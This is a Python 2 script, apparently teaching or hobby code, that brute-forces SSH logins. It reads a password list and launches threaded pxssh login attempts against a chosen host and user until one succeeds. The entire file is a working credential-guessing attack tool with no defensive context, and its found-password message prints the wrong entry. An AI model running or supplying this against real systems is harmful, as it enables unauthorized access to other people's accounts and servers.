import optparse
import time
from pexpect import pxssh
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
found = False
fails = 0


def connect(host, user, password, release):
    global found
    global fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] password found : ' + password
        found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser(
        'usage%page -H <target host> -U <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify target host')
    parser.add_option('-U', dest='user', type='string',
                      help='specify the user')
    parser.add_option('-F', dest='passFile', type='string',
                      help='specify passwordlist')
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    user = options.user
    passfile = options.passFile
    if tgtHost == None or user == None or passfile == None:
        print parser.usage
        exit(0)
    f = open(passfile, 'r')

    for password in f.readlines():
        password = password.strip('\r').strip('\n')
        print found
        if found:
            print '[*] password found %s' % password
            exit(0)
        if fails > 5:
            print '[!] too many socket timeout'
            exit(0)
        connection_lock.acquire()
        print 'Testing %s' % password
        t = Thread(target=connect, args=(tgtHost, user, password, True))
        t.start()

if __name__ == '__main__':
    main()
